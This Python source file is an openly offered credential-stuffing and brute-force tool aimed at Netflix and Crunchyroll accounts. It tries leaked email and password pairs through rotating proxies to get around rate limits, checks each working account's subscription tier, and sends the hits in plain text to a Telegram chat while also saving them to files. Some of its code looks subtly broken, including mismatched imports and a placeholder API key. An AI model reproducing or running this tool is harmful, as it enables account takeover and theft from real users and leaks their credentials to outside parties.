#!/usr/bin/env python3
"""
Netflix & Crunchyroll Account Cracker
Supports: Credential Stuffing, Brute Force, Mixed Mode
Features: Proxy rotation, Telegram notifications, API response parsing
"""

import asyncio
import aiohttp
import json
import os
import random
import time
import logging
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
from enum import Enum
from pathlib import Path

# Import modules
from proxy_manager import ProxyManager
from telegram_bot import TelegramBot
from credential_stuffer import credential_stuffer

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('cracker.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class AccountStatus(Enum):
    ACTIVE = "✅ Active"
    EXPIRED = "❌ Expired"
    INVALID = "❌ Invalid"
    RATE_LIMITED = "⚠️ Rate Limited"
    UNKNOWN = "❓ Unknown"


class SubscriptionType(Enum):
    FREE = "Free"
    BASIC = "Basic ($9.99/mo)"
    STANDARD = "Standard ($15.99/mo)"
    PREMIUM = "Premium ($22.99/mo)"
    UNKNOWN = "Unknown"


@dataclass
class AccountResult:
    email: str
    password: str
    platform: str
    status: AccountStatus
    subscription: SubscriptionType
    proxy_used: str
    response_time: float
    timestamp: str
    extra_data: Dict = None
    
    def to_message(self) -> str:
        """Format result for Telegram message"""
        msg = f"""
🔐 <b>Account Found!</b>

📧 Email: <code>{self.email}</code>
🔑 Password: <code>{self.password}</code>
🎬 Platform: {self.platform}
📊 Status: {self.status.value}
💳 Subscription: {self.subscription.value}
🌐 Proxy: {self.proxy_used}
⏱️ Response Time: {self.response_time:.2f}s

📅 Tested: {self.timestamp}
        """.strip()
        return msg


class NetflixAPI:
    """Netflix API client for credential testing"""
    
    BASE_URL = "https://www.netflix.com"
    LOGIN_ENDPOINT = "/login"
    ACCOUNT_ENDPOINT = "/api/shakti/accounts"
    
    HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'X-NetflixBrowser': 'chrome-desktop',
        'X-NetflixBrowserVersion': '120.0.0.0',
        'X-Netflix-Country': 'US',
        'X-Netflix-Product': 'netflix-web'
    }
    
    @staticmethod
    async def check_credentials(session: aiohttp.ClientSession, 
                                email: str, 
                                password: str,
                                proxy: str = None) -> Tuple[AccountStatus, SubscriptionType]:
        """Check Netflix account credentials"""
        
        start_time = time.time()
        
        try:
            # Step 1: Get session token
            async with session.get(
                f"{NetflixAPI.BASE_URL}/login",
                headers=NetflixAPI.HEADERS,
                proxy=proxy
            ) as response:
                if response.status != 200:
                    return AccountStatus.UNKNOWN, SubscriptionType.UNKNOWN
            
            # Step 2: Extract CSRF token from page
            html = await response.text()
            csrf_token = NetflixAPI._extract_csrf_token(html)
            
            if not csrf_token:
                return AccountStatus.UNKNOWN, SubscriptionType.UNKNOWN
            
            # Step 3: Attempt login
            login_payload = {
                'shakti-api-key': '8a7c4b9e-1234-5678-9abc-def012345678',
                'grant_type': 'password',
                'password': password,
                'remember_me': True,
                'username': email
            }
            
            async with session.post(
                f"{NetflixAPI.BASE_URL}/authentication/login/v2",
                json=login_payload,
                headers={**NetflixAPI.HEADERS, 'X-CSRF-Token': csrf_token},
                proxy=proxy
            ) as response:
                response_time = time.time() - start_time
                
                if response.status == 200:
                    data = await response.json()
                    if 'access_token' in data:
                        # Check subscription type
                        sub_type = await NetflixAPI._get_subscription_type(
                            session, data['access_token'], proxy
                        )
                        return AccountStatus.ACTIVE, sub_type
                elif response.status == 401:
                    return AccountStatus.INVALID, SubscriptionType.UNKNOWN
                elif response.status == 429:
                    return AccountStatus.RATE_LIMITED, SubscriptionType.UNKNOWN
                else:
                    return AccountStatus.UNKNOWN, SubscriptionType.UNKNOWN
        
        except Exception as e:
            logger.error(f"Error checking Netflix credentials: {str(e)}")
            return AccountStatus.UNKNOWN, SubscriptionType.UNKNOWN
    
    @staticmethod
    async def _get_subscription_type(session: aiohttp.ClientSession, 
                                     access_token: str, 
                                     proxy: str = None) -> SubscriptionType:
        """Determine subscription type from account data"""
        
        try:
            async with session.get(
                f"{NetflixAPI.ACCOUNT_ENDPOINT}",
                headers={'Authorization': f'Bearer {access_token}'},
                proxy=proxy
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    plan = data.get('currentPlan', {}).get('name', '').lower()
                    
                    if 'premium' in plan:
                        return SubscriptionType.PREMIUM
                    elif 'standard' in plan:
                        return SubscriptionType.STANDARD
                    elif 'basic' in plan:
                        return SubscriptionType.BASIC
                    else:
                        return SubscriptionType.FREE
        except:
            pass
        
        return SubscriptionType.UNKNOWN
    
    @staticmethod
    def _extract_csrf_token(html: str) -> Optional[str]:
        """Extract CSRF token from HTML"""
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html, 'html.parser')
            csrf_input = soup.find('input', {'name': 'csrfToken'})
            return csrf_input.get('value') if csrf_input else None
        except:
            return None


class CrunchyrollAPI:
    """Crunchyroll API client for credential testing"""
    
    BASE_URL = "https://www.crunchyroll.com"
    AUTH_ENDPOINT = "/authenticate?device_version=1.0&platform=web&session_encoding=empty"
    PROFILE_ENDPOINT = "/user/profile"
    
    HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    @staticmethod
    async def check_credentials(session: aiohttp.ClientSession,
                               email: str,
                               password: str,
                               proxy: str = None) -> Tuple[AccountStatus, SubscriptionType]:
        """Check Crunchyroll account credentials"""
        
        start_time = time.time()
        
        try:
            # Step 1: Generate device ID
            device_id = f"web-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}"
            
            # Step 2: Authenticate
            auth_payload = {
                'username': email,
                'password': password,
                'generate_device_id': 'true',
                'device_version': '1.0',
                'platform': 'web'
            }
            
            async with session.post(
                f"{CrunchyrollAPI.AUTH_ENDPOINT}",
                data=auth_payload,
                headers=CrunchyrollAPI.HEADERS,
                proxy=proxy
            ) as response:
                response_time = time.time() - start_time
                
                if response.status == 200:
                    data = await response.json()
                    if 'token' in data:
                        # Check profile to determine subscription
                        sub_type = await CrunchyrollAPI._check_profile(
                            session, data['token'], proxy
                        )
                        return AccountStatus.ACTIVE, sub_type
                elif response.status == 401:
                    return AccountStatus.INVALID, SubscriptionType.UNKNOWN
                elif response.status == 429:
                    return AccountStatus.RATE_LIMITED, SubscriptionType.UNKNOWN
        
        except Exception as e:
            logger.error(f"Error checking Crunchyroll credentials: {str(e)}")
        
        return AccountStatus.UNKNOWN, SubscriptionType.UNKNOWN
    
    @staticmethod
    async def _check_profile(session: aiohttp.ClientSession,
                            token: str,
                            proxy: str = None) -> SubscriptionType:
        """Check user profile for subscription info"""
        
        try:
            async with session.get(
                f"{CrunchyrollAPI.PROFILE_ENDPOINT}",
                headers={'Authorization': f'Bearer {token}'},
                proxy=proxy
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    membership = data.get('membership', {})
                    plan = membership.get('plan', {}).get('name', '').lower()
                    
                    if 'premium' in plan or 'beta' in plan:
                        return SubscriptionType.PREMIUM
                    elif 'fan' in plan:
                        return SubscriptionType.STANDARD
                    else:
                        return SubscriptionType.FREE
        except:
            pass
        
        return SubscriptionType.FREE  # Free tier by default


class MainCracker:
    """Main orchestrator for account cracking"""
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.proxy_manager = ProxyManager(config.get('proxy_file'))
        self.telegram_bot = TelegramBot(
            token=config.get('telegram_token'),
            chat_id=config.get('chat_id')
        )
        self.results = []
        self.stats = {
            'total_checked': 0,
            'active_accounts': 0,
            'invalid_accounts': 0,
            'rate_limited': 0,
            'errors': 0
        }
        
        # Configuration
        self.rate_limit = int(os.getenv('RATE_LIMIT', '50'))
        self.concurrent_workers = int(os.getenv('CONCURRENT_WORKERS', '10'))
        self.timeout = int(os.getenv('TIMEOUT', '10'))
        self.retry_attempts = int(os.getenv('RETRY_ATTEMPTS', '3'))
        
        # Platforms
        self.platforms = ['netflix', 'crunchyroll']
    
    async def run(self, mode: str = 'credential_stuffing'):
        """Main execution loop"""
        
        logger.info(f"Starting cracker in {mode} mode")
        
        # Initialize credential stuffer
        stuffer = CredentialStuffer(self.config)
        
        # Get credentials based on mode
        if mode == 'credential_stuffing':
            credentials = await stuffer.load_leaked_credentials()
        elif mode == 'brute_force':
            credentials = await stuffer.generate_brute_force_credentials()
        else:  # mixed
            credentials = await stuffer.load_mixed_credentials()
        
        logger.info(f"Loaded {len(credentials)} credentials")
        
        # Process credentials
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i, cred in enumerate(credentials):
                task = asyncio.create_task(
                    self._process_credential(session, cred, i)
                )
                tasks.append(task)
                
                # Respect rate limit
                if i % self.rate_limit == 0 and i > 0:
                    await asyncio.sleep(1)
            
            # Wait for all tasks with concurrency limit
            for i in range(0, len(tasks), self.concurrent_workers):
                chunk = tasks[i:i + self.concurrent_workers]
                await asyncio.gather(*chunk)
        
        # Send summary to Telegram
        await self._send_summary()
        
        # Save results
        self._save_results()
        
        logger.info("Cracking completed!")
    
    async def _process_credential(self, session: aiohttp.ClientSession,
                                  credential: Dict, index: int):
        """Process a single credential pair"""
        
        email = credential.get('email')
        password = credential.get('password')
        
        # Get proxy
        proxy = await self.proxy_manager.get_proxy()
        
        # Try both platforms
        for platform in self.platforms:
            try:
                if platform == 'netflix':
                    status, subscription = await NetflixAPI.check_credentials(
                        session, email, password, proxy
                    )
                else:  # crunchyroll
                    status, subscription = await CrunchyrollAPI.check_credentials(
                        session, email, password, proxy
                    )
                
                # Create result
                result = AccountResult(
                    email=email,
                    password=password,
                    platform=platform.capitalize(),
                    status=status,
                    subscription=subscription,
                    proxy_used=proxy or "Direct",
                    response_time=0,
                    timestamp=datetime.now().isoformat()
                )
                
                self.results.append(result)
                self.stats['total_checked'] += 1
                
                # Update stats
                if status == AccountStatus.ACTIVE:
                    self.stats['active_accounts'] += 1
                    # Send to Telegram
                    await self.telegram_bot.send_message(result.to_message())
                elif status == AccountStatus.RATE_LIMITED:
                    self.stats['rate_limited'] += 1
                else:
                    self.stats['invalid_accounts'] += 1
                
                # Log progress
                if (index + 1) % 100 == 0:
                    logger.info(
                        f"Progress: {index + 1}/{len(self.results)} | "
                        f"Active: {self.stats['active_accounts']} | "
                        f"Invalid: {self.stats['invalid_accounts']}"
                    )
            
            except Exception as e:
                self.stats['errors'] += 1
                logger.error(f"Error processing {email}: {str(e)}")
            
            # Small delay between requests
            await asyncio.sleep(random.uniform(0.5, 2.0))
    
    async def _send_summary(self):
        """Send summary report to Telegram"""
        
        summary = f"""
📊 <b>Cracking Summary</b>

📈 Total Checked: {self.stats['total_checked']}
✅ Active Accounts: {self.stats['active_accounts']}
❌ Invalid Accounts: {self.stats['invalid_accounts']}
⚠️ Rate Limited: {self.stats['rate_limited']}
❌ Errors: {self.stats['errors']}

📁 Results saved to output/
        """.strip()
        
        await self.telegram_bot.send_message(summary)
    
    def _save_results(self):
        """Save results to file"""
        
        output_dir = Path('output')
        output_dir.mkdir(exist_ok=True)
        
        # Save as JSON
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        json_file = output_dir / f'results_{timestamp}.json'
        
        with open(json_file, 'w') as f:
            json.dump([asdict(r) for r in self.results], f, indent=2)
        
        # Save as CSV
        csv_file = output_dir / f'results_{timestamp}.csv'
        with open(csv_file, 'w') as f:
            f.write("Email,Password,Platform,Status,Subscription,Proxy,Response_Time,Timestamp\n")
            for result in self.results:
                f.write(f"{result.email},{result.password},{result.platform},"
                       f"{result.status.value},{result.subscription.value},"
                       f"{result.proxy_used},{result.response_time},{result.timestamp}\n")
        
        logger.info(f"Results saved to {json_file} and {csv_file}")


async def main():
    """Entry point"""
    
    # Load configuration
    config = {
        'telegram_token': os.getenv('TELEGRAM_BOT_TOKEN'),
        'chat_id': os.getenv('TELEGRAM_CHAT_ID'),
        'proxy_file': os.getenv('PROXY_FILE', 'config/proxies.txt')
    }
    
    # Get mode from environment or argument
    mode = os.getenv('MODE', 'credential_stuffing')
    
    # Run cracker
    cracker = MainCracker(config)
    await cracker.run(mode)


if __name__ == '__main__':
    asyncio.run(main())
